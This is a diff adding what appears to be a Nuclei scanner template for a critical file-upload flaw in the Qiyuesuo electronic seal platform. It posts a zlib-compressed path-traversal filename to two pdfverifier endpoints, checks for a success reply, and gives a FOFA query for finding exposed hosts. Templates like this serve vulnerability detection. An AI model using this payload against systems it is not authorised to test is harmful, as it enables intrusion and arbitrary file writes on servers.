@@ -1,0 +1,69 @@
+id: qiyuesuo-pdfverifier-fileupload
+
+info:
+  name: Qiyuesuo Electronic Seal Platform PDF Verifier - File Upload
+  author: qwtd
+  severity: critical
+  description: |
+    该漏洞源于电子签章系统在处理用户提交的特定格式数据时，输入验证和执行逻辑存在缺陷，导致安全防护机制被绕过。攻击者利用这一缺陷，通过精心构造的恶意请求，在服务器上注入并执行任意系统命令.
+  metadata:
+    fofa-query: icon_hash="738823048"
+  tags: 契约锁-电子签署平台
+
+variables:
+  r1: "{{rand_text_alphanumeric(16)}}"
+  p1: "{{zlib('../../../../../../tmp/test\n')}}"
+
+flow: |
+  http(1) || http(2)
+
+http:
+  - id: r0
+    method: POST
+    path:
+      - "{{BaseURL}}/pdfverifier"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundary{{r1}}"
+    body: |
+      ------WebKitFormBoundary{{r1}}
+      Content-Disposition: form-data; name="file"; filename="test.ofd"
+      Content-Type: image/jpeg
+
+      {{p1}}
+      ------WebKitFormBoundary{{r1}}--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "statusCode"
+          - '\u8BF7\u6C42\u6210\u529F'
+        condition: and
+  
+  - id: r1
+    method: POST
+    path:
+      - "{{BaseURL}}/api/pdfverifier"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundary{{r1}}"
+    body: |
+      ------WebKitFormBoundary{{r1}}
+      Content-Disposition: form-data; name="file"; filename="test.ofd"
+      Content-Type: image/jpeg
+
+      {{p1}}
+      ------WebKitFormBoundary{{r1}}--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "statusCode"
+          - '\u8BF7\u6C42\u6210\u529F'
+        condition: and
